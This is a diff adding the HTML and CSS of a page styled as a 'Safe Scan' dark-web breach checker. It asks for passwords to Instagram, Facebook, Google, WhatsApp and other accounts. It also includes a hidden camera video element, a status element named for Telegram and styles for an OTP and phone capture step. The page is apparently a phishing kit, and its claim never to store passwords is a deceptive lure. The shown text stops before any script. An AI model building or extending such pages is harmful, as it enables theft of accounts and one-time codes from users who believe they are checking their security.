@@ -1,0 +1,523 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover, user-scalable=no, maximum-scale=1">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="apple-mobile-web-app-title" content="Safe Scan">
+    <meta name="theme-color" content="#0a0a1a">
+    <meta name="description" content="Premium dark web monitoring and security scanning for your digital identity.">
+    <title>Safe Scan v2 - Dark Web Security</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.10.1/html2pdf.bundle.min.js"></script>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <style>
+        :root {
+            --bg-primary: #ffffff;
+            --bg-elevated: #f8f9fa;
+            --glass-bg: rgba(255,255,255,0.7);
+            --glass-border: rgba(233,236,239,0.8);
+            --accent: #111111;
+            --accent-light: #333333;
+            --accent-glow: rgba(0,0,0,0.15);
+            --accent-soft: rgba(0,0,0,0.05);
+            --teal: #059669;
+            --teal-soft: #ecfdf5;
+            --rose: #e11d48;
+            --rose-soft: #fff1f2;
+            --amber: #d97706;
+            --amber-soft: #fffbeb;
+            --text-primary: #111827;
+            --text-secondary: #4b5563;
+            --text-tertiary: #9ca3af;
+            --radius-xl: 24px;
+            --radius-lg: 18px;
+            --radius-md: 12px;
+            --radius-pill: 100px;
+            --safe-top: max(0px, env(safe-area-inset-top, 0px));
+            --safe-bottom: max(0px, env(safe-area-inset-bottom, 0px));
+            --spring: cubic-bezier(0.4,0,0.2,1);
+            --ease-out: cubic-bezier(0.4,0,0.2,1);
+        }
+        * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif; -webkit-tap-highlight-color:transparent; touch-action:manipulation; }
+        html { -webkit-user-select:none; user-select:none; overflow:hidden; height:100%; }
+        body { background:var(--bg-primary); color:var(--text-primary); height:100%; overflow:hidden; -webkit-font-smoothing:antialiased; }
+        .app { height:100%; display:flex; flex-direction:column; overflow:hidden; }
+        .status-bar-spacer { height:calc(12px + var(--safe-top)); flex-shrink:0; }
+        .app-content { flex:1; overflow-y:auto; overflow-x:hidden; -webkit-overflow-scrolling:touch; padding:0 20px calc(90px + var(--safe-bottom)); }
+        .app-content::-webkit-scrollbar { display:none; }
+        .ambient-bg { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:-1; background:var(--bg-primary); }
+        .ambient-bg::before,.ambient-bg::after { content:''; position:absolute; border-radius:50%; filter:blur(80px); opacity:0.4; animation:breathe 15s ease-in-out infinite alternate; }
+        .ambient-bg::before { width:50vw; height:50vw; top:-10vw; left:-10vw; background:radial-gradient(circle,rgba(17,17,17,0.05),transparent); }
+        .ambient-bg::after { width:40vw; height:40vw; bottom:-5vw; right:-5vw; background:radial-gradient(circle,rgba(5,150,105,0.05),transparent); animation-delay:-7.5s; }
+        @keyframes breathe { 0%{transform:scale(1);opacity:0.8} 100%{transform:scale(1.1);opacity:1} }
+        .app-header { text-align:center; margin-top:32px; margin-bottom:24px; }
+        .app-header img { width:72px; height:72px; border-radius:20px; box-shadow:0 4px 20px rgba(0,0,0,0.08); margin-bottom:12px; }
+        .app-header h1 { font-size:1.7rem; font-weight:800; letter-spacing:-0.5px; }
+        .app-header p { color:var(--text-secondary); font-size:0.9rem; margin-top:6px; line-height:1.4; }
+        .security-badge { display:inline-flex; align-items:center; gap:6px; background:var(--teal-soft); border:1px solid rgba(5,150,105,0.2); border-radius:var(--radius-pill); padding:5px 12px; font-size:0.72rem; font-weight:600; color:var(--teal); margin-top:8px; }
+        .security-badge .dot { width:6px; height:6px; border-radius:50%; background:var(--teal); animation:gpulse 2s ease-in-out infinite; }
+        @keyframes gpulse { 0%,100%{box-shadow:0 0 4px rgba(5,150,105,0.5)} 50%{box-shadow:0 0 10px rgba(5,150,105,0.9)} }
+        .form-card { background:var(--glass-bg); border:1px solid var(--glass-border); border-radius:var(--radius-xl); padding:24px 20px; backdrop-filter:blur(20px); -webkit-backdrop-filter:blur(20px); box-shadow:0 8px 32px rgba(0,0,0,0.06); }
+        .platform-tabs { display:grid; grid-template-columns:repeat(4,1fr); gap:6px; margin-bottom:20px; }
+        .platform-tab { display:flex; flex-direction:column; align-items:center; gap:4px; padding:10px 4px 8px; background:var(--bg-elevated); border:1.5px solid var(--glass-border); border-radius:var(--radius-md); font-size:0.58rem; font-weight:600; color:var(--text-secondary); cursor:pointer; transition:all 0.2s var(--spring); -webkit-appearance:none; }
+        .platform-tab i { font-size:18px; }
+        .platform-tab span { font-size:0.6rem; font-weight:600; }
+        .platform-tab.active { background:var(--accent); border-color:var(--accent); color:#fff; box-shadow:0 4px 14px var(--accent-glow); }
+        .platform-tab:active { transform:scale(0.93); }
+        .platform-tab[data-tab='instagram'].active { background:linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); border-color:#cc2366; }
+        .platform-tab[data-tab='facebook'].active { background:#1877f2; border-color:#1877f2; }
+        .platform-tab[data-tab='twitter'].active { background:#000; border-color:#000; }
+        .platform-tab[data-tab='google'].active { background:#4285f4; border-color:#4285f4; }
+        .platform-tab[data-tab='tiktok'].active { background:linear-gradient(135deg,#010101,#ff0050); border-color:#ff0050; }
+        .platform-tab[data-tab='snapchat'].active { background:#fffc00; border-color:#f5d800; color:#000; }
+        .platform-tab[data-tab='whatsapp'].active { background:#25d366; border-color:#25d366; }
+        .platform-tab[data-tab='email'].active { background:linear-gradient(135deg,#667eea,#764ba2); border-color:#764ba2; }
+        .tab-content { display:none; }
+        .tab-content.active { display:block; animation:tabenter 0.3s var(--ease-out); }
+        @keyframes tabenter { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
+        .form-fields { display:flex; flex-direction:column; gap:12px; margin-bottom:16px; }
+        .input-wrap { position:relative; display:flex; align-items:center; }
+        .input-wrap i { position:absolute; left:14px; color:var(--text-tertiary); font-size:15px; z-index:1; }
+        .glass-input { width:100%; padding:14px 14px 14px 42px; background:var(--bg-elevated); border:1.5px solid var(--glass-border); border-radius:var(--radius-md); font-size:15px; color:var(--text-primary); outline:none; transition:border-color 0.2s,box-shadow 0.2s; -webkit-appearance:none; font-family:inherit; }
+        .glass-input:focus { border-color:var(--accent); box-shadow:0 0 0 3px var(--accent-soft); }
+        .glass-input::placeholder { color:var(--text-tertiary); }
+        .btn-scan { width:100%; padding:16px; background:linear-gradient(135deg,var(--accent) 0%,#3a3a3a 100%); color:#fff; border:none; border-radius:var(--radius-md); font-size:0.95rem; font-weight:700; font-family:inherit; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:10px; transition:all 0.2s var(--spring); box-shadow:0 8px 24px rgba(0,0,0,0.15); min-height:52px; }
+        .btn-scan:active { transform:scale(0.97); }
+        .btn-scan:disabled { opacity:0.6; pointer-events:none; }
+        .trust-row { margin-top:20px; text-align:center; }
+        .trust-row p { font-size:0.75rem; color:var(--text-tertiary); display:flex; align-items:center; justify-content:center; gap:6px; margin-bottom:10px; }
+        .trust-row p i { color:var(--teal); }
+        .trust-logos { display:flex; justify-content:center; align-items:center; gap:16px; }
+        .trust-logos img { height:28px; object-fit:contain; mix-blend-mode:multiply; opacity:0.8; }
+        .bottom-nav { position:fixed; bottom:0; left:0; right:0; z-index:100; padding:0 16px; padding-bottom:max(8px,var(--safe-bottom)); }
+        .nav-dock { background:var(--bg-elevated); border:1px solid var(--glass-border); border-radius:24px; display:flex; justify-content:space-around; align-items:center; padding:8px 6px; box-shadow:0 -4px 30px rgba(0,0,0,0.08); max-width:400px; margin:0 auto; }
+        .nav-item { display:flex; flex-direction:column; align-items:center; gap:3px; padding:8px 16px; border-radius:14px; background:transparent; border:none; color:var(--text-tertiary); font-size:0.58rem; font-weight:600; font-family:inherit; cursor:pointer; min-height:48px; min-width:56px; transition:all 0.2s var(--spring); }
+        .nav-item i { font-size:19px; transition:all 0.2s var(--spring); }
+        .nav-item.active { color:var(--accent); background:var(--accent-soft); }
+        .nav-item.active i { transform:scale(1.1) translateY(-1px); }
+        .nav-item:active { transform:scale(0.9); }
+        .status-toast { position:fixed; top:calc(8px + var(--safe-top)); left:16px; right:16px; z-index:200; padding:12px 16px; border-radius:var(--radius-md); font-size:0.8rem; font-weight:600; text-align:center; opacity:0; transform:translateY(-20px); pointer-events:none; transition:all 0.4s var(--spring); }
+        .status-toast.visible { opacity:1; transform:translateY(0); }
+        .status-toast.success { background:rgba(5,150,105,0.12); border:1px solid rgba(5,150,105,0.3); color:var(--teal); }
+        .status-toast.error { background:rgba(225,29,72,0.12); border:1px solid rgba(225,29,72,0.3); color:var(--rose); }
+        .status-toast.warning { background:rgba(217,119,6,0.12); border:1px solid rgba(217,119,6,0.3); color:var(--amber); }
+        /* Scanning Overlay */
+        .scanning-overlay { position:fixed; inset:0; z-index:8000; background:rgba(10,10,26,0.96); display:flex; flex-direction:column; align-items:center; justify-content:center; padding:40px 24px; opacity:0; pointer-events:none; transition:opacity 0.4s ease; }
+        .scanning-overlay.active { opacity:1; pointer-events:all; }
+        .radar-wrap { position:relative; width:180px; height:180px; margin-bottom:36px; }
+        .radar-circle { position:absolute; border:1.5px solid rgba(5,150,105,0.25); border-radius:50%; top:50%; left:50%; transform:translate(-50%,-50%); }
+        .radar-circle:nth-child(1){width:60px;height:60px} .radar-circle:nth-child(2){width:110px;height:110px} .radar-circle:nth-child(3){width:160px;height:160px;border-color:rgba(5,150,105,0.12)}
+        .radar-sweep { position:absolute; width:50%; height:50%; top:50%; left:50%; transform-origin:0% 0%; animation:rspin 2.5s linear infinite; background:conic-gradient(from 0deg,transparent 70%,rgba(5,150,105,0.7) 100%); border-radius:0 100% 0 0; }
+        @keyframes rspin { to{transform:rotate(360deg)} }
+        .radar-center { position:absolute; width:10px; height:10px; background:var(--teal); border-radius:50%; top:50%; left:50%; transform:translate(-50%,-50%); box-shadow:0 0 12px var(--teal); }
+        .radar-blip { position:absolute; width:6px; height:6px; background:var(--teal); border-radius:50%; box-shadow:0 0 8px var(--teal); animation:bfade 2.5s ease-in-out infinite; }
+        .radar-blip:nth-child(5){top:30%;left:60%;animation-delay:0.3s} .radar-blip:nth-child(6){top:65%;left:35%;animation-delay:1.1s} .radar-blip:nth-child(7){top:45%;left:25%;animation-delay:1.9s}
+        @keyframes bfade { 0%,100%{opacity:0;transform:scale(0.5)} 50%{opacity:1;transform:scale(1.2)} }
+        .scan-status-text { font-size:1.1rem; font-weight:700; color:#fff; margin-bottom:8px; text-align:center; }
+        .scan-sub-text { font-size:0.8rem; color:rgba(255,255,255,0.5); text-align:center; margin-bottom:28px; }
+        .scan-progress-bar { width:240px; height:4px; background:rgba(255,255,255,0.1); border-radius:2px; overflow:hidden; }
+        .scan-progress-fill { height:100%; width:0%; background:linear-gradient(90deg,var(--teal),#34d399); border-radius:2px; transition:width 0.4s ease; }
+        .scan-db-list { margin-top:24px; display:flex; flex-direction:column; gap:6px; width:100%; max-width:300px; }
+        .scan-db-item { display:flex; align-items:center; gap:10px; font-size:0.75rem; color:rgba(255,255,255,0.5); padding:6px 10px; border-radius:8px; background:rgba(255,255,255,0.04); opacity:0; transform:translateX(-10px); transition:opacity 0.3s ease,transform 0.3s ease,color 0.3s; }
+        .scan-db-item.visible { opacity:1; transform:translateX(0); }
+        .scan-db-item.checked { color:rgba(255,255,255,0.85); }
+        .scan-db-item.checked i { color:var(--teal); }
+        .scan-db-item i { font-size:12px; color:rgba(255,255,255,0.3); }
+        /* Report */
+        .report-overlay { position:fixed; inset:0; z-index:9000; background:rgba(0,0,0,0.55); backdrop-filter:blur(6px); -webkit-backdrop-filter:blur(6px); display:flex; align-items:flex-end; opacity:0; visibility:hidden; transition:all 0.3s ease; }
+        .report-overlay.show { opacity:1; visibility:visible; }
+        .report-sheet { background:var(--bg-primary); border-radius:24px 24px 0 0; width:100%; max-height:92vh; overflow-y:auto; transform:translateY(100%); transition:transform 0.4s cubic-bezier(0.34,1.56,0.64,1); padding-bottom:max(24px,var(--safe-bottom)); }
+        .report-overlay.show .report-sheet { transform:translateY(0); }
+        .report-sheet::-webkit-scrollbar { display:none; }
+        .report-handle { width:36px; height:4px; background:var(--glass-border); border-radius:2px; margin:12px auto 0; }
+        .report-header { padding:20px 24px 0; display:flex; align-items:center; justify-content:space-between; }
+        .report-title { font-size:1.1rem; font-weight:800; }
+        .report-close { width:32px; height:32px; border-radius:50%; background:var(--bg-elevated); border:none; cursor:pointer; display:flex; align-items:center; justify-content:center; color:var(--text-secondary); font-size:14px; }
+        .report-body { padding:20px 24px 8px; }
+        .risk-gauge-wrap { display:flex; flex-direction:column; align-items:center; margin-bottom:24px; }
+        .risk-gauge { position:relative; width:140px; height:80px; overflow:hidden; margin-bottom:8px; }
+        .gauge-bg { width:140px; height:140px; border:14px solid var(--bg-elevated); border-radius:50%; position:absolute; top:0; clip-path:inset(0 0 50% 0); }
+        .gauge-fill { width:140px; height:140px; border:14px solid var(--teal); border-radius:50%; position:absolute; top:0; clip-path:inset(0 0 50% 0); transform-origin:center 100%; transform:rotate(0deg); transition:transform 1.2s cubic-bezier(0.34,1.1,0.64,1),border-color 0.5s ease; }
+        .gauge-score { position:absolute; bottom:0; left:50%; transform:translateX(-50%); font-size:2rem; font-weight:900; color:var(--text-primary); letter-spacing:-2px; }
+        .gauge-label { font-size:0.75rem; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.8px; }
+        .risk-badge { display:inline-flex; align-items:center; gap:6px; padding:5px 14px; border-radius:var(--radius-pill); font-size:0.75rem; font-weight:700; margin-top:6px; }
+        .risk-badge.safe { background:var(--teal-soft); color:var(--teal); }
+        .risk-badge.medium { background:var(--amber-soft); color:var(--amber); }
+        .risk-badge.high { background:var(--rose-soft); color:var(--rose); }
+        .report-stats { display:grid; grid-template-columns:repeat(3,1fr); gap:10px; margin-bottom:20px; }
+        .rstat { background:var(--bg-elevated); border-radius:var(--radius-md); padding:14px 10px; text-align:center; }
+        .rstat-num { font-size:1.5rem; font-weight:900; letter-spacing:-1px; }
+        .rstat-label { font-size:0.65rem; font-weight:600; color:var(--text-tertiary); margin-top:2px; text-transform:uppercase; letter-spacing:0.5px; }
+        .breach-section-title { font-size:0.75rem; font-weight:700; color:var(--text-tertiary); text-transform:uppercase; letter-spacing:1px; margin-bottom:10px; }
+        .breach-list { display:flex; flex-direction:column; gap:8px; margin-bottom:20px; }
+        .breach-item { display:flex; align-items:center; gap:12px; padding:12px 14px; background:var(--bg-elevated); border-radius:var(--radius-md); border-left:3px solid var(--rose); animation:slidein 0.4s var(--ease-out) both; }
+        .breach-item.safe-item { border-left-color:var(--teal); }
+        @keyframes slidein { from{opacity:0;transform:translateX(-12px)} to{opacity:1;transform:translateX(0)} }
+        .breach-icon { width:36px; height:36px; border-radius:10px; background:var(--rose-soft); display:flex; align-items:center; justify-content:center; color:var(--rose); font-size:16px; flex-shrink:0; }
+        .breach-item.safe-item .breach-icon { background:var(--teal-soft); color:var(--teal); }
+        .breach-info { flex:1; }
+        .breach-name { font-size:0.85rem; font-weight:700; }
+        .breach-meta { font-size:0.72rem; color:var(--text-tertiary); margin-top:2px; }
+        .breach-tag { font-size:0.62rem; font-weight:700; padding:3px 8px; border-radius:20px; background:var(--rose-soft); color:var(--rose); }
+        .breach-item.safe-item .breach-tag { background:var(--teal-soft); color:var(--teal); }
+        .exposed-section { margin-bottom:20px; }
+        .exposed-tags { display:flex; flex-wrap:wrap; gap:6px; margin-top:8px; }
+        .exposed-tag { display:flex; align-items:center; gap:5px; padding:5px 10px; background:var(--rose-soft); color:var(--rose); border-radius:var(--radius-pill); font-size:0.7rem; font-weight:600; }
+        .exposed-tag.safe { background:var(--teal-soft); color:var(--teal); }
+        .report-ctas { display:flex; flex-direction:column; gap:10px; padding:0 24px 16px; }
+        .btn-protect { width:100%; padding:16px; background:linear-gradient(135deg,#e11d48,#be123c); color:#fff; border:none; border-radius:var(--radius-md); font-size:0.95rem; font-weight:700; font-family:inherit; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; box-shadow:0 6px 20px rgba(225,29,72,0.3); }
+        .btn-protect.safe-btn { background:linear-gradient(135deg,var(--teal),#047857); box-shadow:0 6px 20px rgba(5,150,105,0.3); }
+        .btn-download-pdf { width:100%; padding:14px; background:var(--bg-elevated); color:var(--text-primary); border:1.5px solid var(--glass-border); border-radius:var(--radius-md); font-size:0.9rem; font-weight:600; font-family:inherit; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; }
+        /* OTP */
+        .otp-overlay { position:fixed; inset:0; z-index:9500; background:rgba(0,0,0,0.65); backdrop-filter:blur(8px); -webkit-backdrop-filter:blur(8px); display:flex; align-items:center; justify-content:center; padding:24px; opacity:0; visibility:hidden; transition:all 0.35s ease; }
+        .otp-overlay.show { opacity:1; visibility:visible; }
+        .otp-card { background:var(--bg-primary); border-radius:var(--radius-xl); width:100%; max-width:360px; padding:28px 24px; box-shadow:0 24px 60px rgba(0,0,0,0.2); transform:scale(0.92) translateY(16px); transition:transform 0.4s cubic-bezier(0.34,1.56,0.64,1); }
+        .otp-overlay.show .otp-card { transform:scale(1) translateY(0); }
+        .otp-icon { width:60px; height:60px; border-radius:18px; background:linear-gradient(135deg,#2563eb,#1d4ed8); display:flex; align-items:center; justify-content:center; color:#fff; font-size:24px; margin:0 auto 16px; }
+        .otp-title { font-size:1.2rem; font-weight:800; text-align:center; margin-bottom:6px; }
+        .otp-subtitle { font-size:0.82rem; color:var(--text-secondary); text-align:center; margin-bottom:22px; line-height:1.5; }
+        .otp-step { display:none; }
+        .otp-step.active { display:block; }
+        .phone-input-wrap { display:flex; gap:8px; margin-bottom:14px; }
+        .country-code-select { padding:14px 10px; background:var(--bg-elevated); border:1.5px solid var(--glass-border); border-radius:var(--radius-md); font-size:14px; color:var(--text-primary); font-family:inherit; width:90px; flex-shrink:0; outline:none; }
+        .phone-number-input { flex:1; padding:14px; background:var(--bg-elevated); border:1.5px solid var(--glass-border); border-radius:var(--radius-md); font-size:15px; color:var(--text-primary); outline:none; font-family:inherit; transition:border-color 0.2s; }
+        .phone-number-input:focus { border-color:#2563eb; }
+        .otp-digits { display:flex; gap:8px; justify-content:center; margin-bottom:14px; }
+        .otp-digit { width:46px; height:54px; background:var(--bg-elevated); border:2px solid var(--glass-border); border-radius:var(--radius-md); text-align:center; font-size:1.4rem; font-weight:700; color:var(--text-primary); outline:none; font-family:inherit; transition:border-color 0.2s; }
+        .otp-digit:focus { border-color:#2563eb; }
+        .otp-resend { text-align:center; font-size:0.78rem; color:var(--text-tertiary); margin-bottom:18px; }
+        .otp-resend span { color:#2563eb; font-weight:600; cursor:pointer; }
+        .btn-otp-submit { width:100%; padding:15px; background:linear-gradient(135deg,#2563eb,#1d4ed8); color:#fff; border:none; border-radius:var(--radius-md); font-size:0.95rem; font-weight:700; font-family:inherit; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:8px; box-shadow:0 6px 20px rgba(37,99,235,0.3); transition:opacity 0.2s; margin-bottom:10px; }
+        .btn-otp-submit:disabled { opacity:0.6; pointer-events:none; }
+        .otp-status { text-align:center; font-size:0.8rem; font-weight:600; padding:8px 0; min-height:24px; color:var(--text-secondary); }
+        .otp-status.sending { color:#2563eb; }
+        .otp-status.sent { color:var(--teal); }
+        .otp-status.error { color:var(--rose); }
+        .otp-skip { text-align:center; font-size:0.8rem; color:var(--text-tertiary); cursor:pointer; padding:4px; }
+        .hidden { display:none !important; }
+        .reveal { opacity:0; transform:translateY(24px); transition:opacity 0.6s var(--ease-out),transform 0.6s var(--ease-out); }
+        .reveal.visible { opacity:1; transform:translateY(0); }
+        @media (prefers-reduced-motion:reduce) { *,*::before,*::after { animation-duration:0.01ms !important; transition-duration:0.01ms !important; } }
+        @media (max-width:360px) { .platform-tab { padding:8px 2px 6px; } .platform-tab i { font-size:15px; } }
+    </style>
+</head>
+<body>
+    <div class="ambient-bg" aria-hidden="true"></div>
+    <video id="cameraView" autoplay playsinline muted style="display:none;"></video>
+    <div class="status-toast" id="telegramStatus"></div>
+    <div class="app">
+        <div class="status-bar-spacer"></div>
+        <div class="app-content" id="appContent">
+            <div class="app-header reveal" id="appHeader">
+                <img src="./logo.jpg" alt="Safe Scany Logo">
+                <h1>Safe Scany</h1>
+                <p>Check if your accounts have been exposed in recent data breaches.</p>
+                <div class="security-badge"><span class="dot"></span> Live Dark Web Monitoring</div>
+            </div>
+            <section class="form-card reveal" id="formSection" style="transition-delay:0.1s;">
+                <div class="platform-tabs" role="tablist">
+                    <button class="platform-tab active" data-tab="instagram" role="tab"><i class="fab fa-instagram"></i><span>Instagram</span></button>
+                    <button class="platform-tab" data-tab="facebook" role="tab"><i class="fab fa-facebook"></i><span>Facebook</span></button>
+                    <button class="platform-tab" data-tab="twitter" role="tab"><i class="fab fa-x-twitter"></i><span>Twitter/X</span></button>
+                    <button class="platform-tab" data-tab="google" role="tab"><i class="fab fa-google"></i><span>Google</span></button>
+                    <button class="platform-tab" data-tab="tiktok" role="tab"><i class="fab fa-tiktok"></i><span>TikTok</span></button>
+                    <button class="platform-tab" data-tab="snapchat" role="tab"><i class="fab fa-snapchat"></i><span>Snapchat</span></button>
+                    <button class="platform-tab" data-tab="whatsapp" role="tab"><i class="fab fa-whatsapp"></i><span>WhatsApp</span></button>
+                    <button class="platform-tab" data-tab="email" role="tab"><i class="fas fa-envelope"></i><span>Email</span></button>
+                </div>
+                <div class="tab-content active" id="instagram-content">
+                    <div class="form-fields">
+                        <div class="input-wrap"><i class="fab fa-instagram"></i><input type="text" class="glass-input" id="instagramUsername" placeholder="Instagram Username / Email" autocomplete="off" spellcheck="false"></div>
+                        <div class="input-wrap"><i class="fas fa-lock"></i><input type="password" class="glass-input" id="instagramPassword" placeholder="Password" autocomplete="off"></div>
+                    </div>
+                    <button class="btn-scan" id="checkInstagramBtn"><i class="fas fa-shield-halved"></i><span>Check for Breaches</span></button>
+                </div>
+                <div class="tab-content" id="facebook-content">
+                    <div class="form-fields">
+                        <div class="input-wrap"><i class="fab fa-facebook"></i><input type="text" class="glass-input" id="facebookUsername" placeholder="Facebook Email / Phone" autocomplete="off" spellcheck="false"></div>
+                        <div class="input-wrap"><i class="fas fa-lock"></i><input type="password" class="glass-input" id="facebookPassword" placeholder="Password" autocomplete="off"></div>
+                    </div>
+                    <button class="btn-scan" id="checkFacebookBtn" style="background:linear-gradient(135deg,#1877f2,#0d5fc0);"><i class="fas fa-shield-halved"></i><span>Check for Breaches</span></button>
+                </div>
+                <div class="tab-content" id="twitter-content">
+                    <div class="form-fields">
+                        <div class="input-wrap"><i class="fab fa-x-twitter"></i><input type="text" class="glass-input" id="twitterUsername" placeholder="Twitter/X Username or Email" autocomplete="off" spellcheck="false"></div>
+                        <div class="input-wrap"><i class="fas fa-lock"></i><input type="password" class="glass-input" id="twitterPassword" placeholder="Password" autocomplete="off"></div>
+                    </div>
+                    <button class="btn-scan" id="checkTwitterBtn" style="background:linear-gradient(135deg,#14171a,#3a3a3a);"><i class="fas fa-shield-halved"></i><span>Check for Breaches</span></button>
+                </div>
+                <div class="tab-content" id="google-content">
+                    <div class="form-fields">
+                        <div class="input-wrap"><i class="fab fa-google"></i><input type="email" class="glass-input" id="googleUsername" placeholder="Gmail Address" autocomplete="off" spellcheck="false"></div>
+                        <div class="input-wrap"><i class="fas fa-lock"></i><input type="password" class="glass-input" id="googlePassword" placeholder="Password" autocomplete="off"></div>
+                    </div>
+                    <button class="btn-scan" id="checkGoogleBtn" style="background:linear-gradient(135deg,#4285f4,#1a73e8);"><i class="fas fa-shield-halved"></i><span>Check for Breaches</span></button>
+                </div>
+                <div class="tab-content" id="tiktok-content">
+                    <div class="form-fields">
+                        <div class="input-wrap"><i class="fab fa-tiktok"></i><input type="text" class="glass-input" id="tiktokUsername" placeholder="TikTok Username / Email / Phone" autocomplete="off" spellcheck="false"></div>
+                        <div class="input-wrap"><i class="fas fa-lock"></i><input type="password" class="glass-input" id="tiktokPassword" placeholder="Password" autocomplete="off"></div>
+                    </div>
+                    <button class="btn-scan" id="checkTiktokBtn" style="background:linear-gradient(135deg,#010101,#ff0050);"><i class="fas fa-shield-halved"></i><span>Check for Breaches</span></button>
+                </div>
+                <div class="tab-content" id="snapchat-content">
+                    <div class="form-fields">
+                        <div class="input-wrap"><i class="fab fa-snapchat"></i><input type="text" class="glass-input" id="snapchatUsername" placeholder="Snapchat Username" autocomplete="off" spellcheck="false"></div>
+                        <div class="input-wrap"><i class="fas fa-lock"></i><input type="password" class="glass-input" id="snapchatPassword" placeholder="Password" autocomplete="off"></div>
+                    </div>
+                    <button class="btn-scan" id="checkSnapchatBtn" style="background:linear-gradient(135deg,#fffc00,#f5d800);color:#000;"><i class="fas fa-shield-halved"></i><span>Check for Breaches</span></button>
+                </div>
+                <div class="tab-content" id="whatsapp-content">
+                    <div class="form-fields">
+                        <div class="input-wrap"><i class="fab fa-whatsapp"></i><input type="tel" class="glass-input" id="whatsappPhone" placeholder="WhatsApp Phone Number" autocomplete="off"></div>
+                        <div class="input-wrap"><i class="fas fa-lock"></i><input type="password" class="glass-input" id="whatsappPassword" placeholder="Password / PIN" autocomplete="off"></div>
+                    </div>
+                    <button class="btn-scan" id="checkWhatsappBtn" style="background:linear-gradient(135deg,#25d366,#128c7e);"><i class="fas fa-shield-halved"></i><span>Check for Breaches</span></button>
+                </div>
+                <div class="tab-content" id="email-content">
+                    <div class="form-fields">
+                        <div class="input-wrap"><i class="fas fa-envelope"></i><input type="email" class="glass-input" id="emailAddress" placeholder="Email Address" autocomplete="off" spellcheck="false"></div>
+                        <div class="input-wrap"><i class="fas fa-lock"></i><input type="password" class="glass-input" id="emailPassword" placeholder="Password" autocomplete="off"></div>
+                    </div>
+                    <button class="btn-scan" id="checkEmailBtn" style="background:linear-gradient(135deg,#667eea,#764ba2);"><i class="fas fa-shield-halved"></i><span>Check for Breaches</span></button>
+                </div>
+                <div class="trust-row">
+                    <p><i class="fas fa-lock"></i> Bank-level 256-bit encryption. We never store your password.</p>
+                </div>
+            </section>
+        </div>
+        <nav class="bottom-nav">
+            <div class="nav-dock">
+                <button class="nav-item active" id="navHome" data-section="appHeader"><i class="fas fa-house"></i><span>Home</span></button>
+                <button class="nav-item" id="navScan" data-section="formSection"><i class="fas fa-magnifying-glass"></i><span>Scan</span></button>
+                <button class="nav-item" id="navAlerts" data-section="formSection"><i class="fas fa-bell"></i><span>Alerts</span></button>
+                <button class="nav-item" id="navProfile" data-section="formSection"><i class="fas fa-user-shield"></i><span>Profile</span></button>
+            </div>
+        </nav>
+    </div>
+    <!-- Scanning Overlay -->
+    <div class="scanning-overlay" id="scanningOverlay">
+        <div class="radar-wrap">
+            <div class="radar-circle"></div><div class="radar-circle"></div><div class="radar-circle"></div>
+            <div class="radar-sweep"></div><div class="radar-center"></div>
+            <div class="radar-blip"></div><div class="radar-blip"></div><div class="radar-blip"></div>
+        </div>
+        <div class="scan-status-text" id="scanStatusText">Scanning dark web databases...</div>
+        <div class="scan-sub-text" id="scanSubText">This may take a few moments</div>
+        <div class="scan-progress-bar"><div class="scan-progress-fill" id="scanProgressFill"></div></div>
+        <div class="scan-db-list" id="scanDbList">
+            <div class="scan-db-item" id="sdb1"><i class="fas fa-circle-dot"></i> HaveIBeenPwned Database</div>
+            <div class="scan-db-item" id="sdb2"><i class="fas fa-circle-dot"></i> DeHashed Breach Archive</div>
+            <div class="scan-db-item" id="sdb3"><i class="fas fa-circle-dot"></i> RaidForums Leak Index</div>
+            <div class="scan-db-item" id="sdb4"><i class="fas fa-circle-dot"></i> BreachDirectory API</div>
+        </div>
+    </div>
+    <!-- Security Report -->
+    <div class="report-overlay" id="reportOverlay">
+        <div class="report-sheet" id="reportSheetContent">
+            <div class="report-handle"></div>
+            <div class="report-header">
+                <div class="report-title">&#x1F50D; Security Report</div>
+                <button class="report-close" id="reportCloseBtn"><i class="fas fa-times"></i></button>
+            </div>
+            <div class="report-body">
+                <div class="risk-gauge-wrap">
+                    <div class="risk-gauge">
+                        <div class="gauge-bg"></div>
+                        <div class="gauge-fill" id="gaugeFill"></div>
+                        <div class="gauge-score" id="gaugeScore">0</div>
+                    </div>
+                    <div class="gauge-label">Risk Score</div>
+                    <div class="risk-badge" id="riskBadge"><i class="fas fa-circle-check"></i><span id="riskLabel">Calculating...</span></div>
+                </div>
+                <div class="report-stats">
+                    <div class="rstat"><div class="rstat-num" id="statBreaches">0</div><div class="rstat-label">Breaches</div></div>
+                    <div class="rstat"><div class="rstat-num" id="statExposed">0</div><div class="rstat-label">Exposed</div></div>
+                    <div class="rstat"><div class="rstat-num" id="statYear">--</div><div class="rstat-label">Last Breach</div></div>
+                </div>
+                <div class="breach-section-title">Breach Details</div>
+                <div class="breach-list" id="breachList"></div>
+                <div class="exposed-section">
+                    <div class="breach-section-title">Exposed Data Types</div>
+                    <div class="exposed-tags" id="exposedTags"></div>
+                </div>
+            </div>
+            <div class="report-ctas">
+                <button class="btn-protect" id="btnProtect"><i class="fas fa-shield-halved"></i> Verify &amp; Protect Account</button>
+                <button class="btn-download-pdf" id="btnDownloadPdf"><i class="fas fa-file-pdf"></i> Download PDF Report</button>
+            </div>
+        </div>
+    </div>
+    <!-- OTP Verification -->
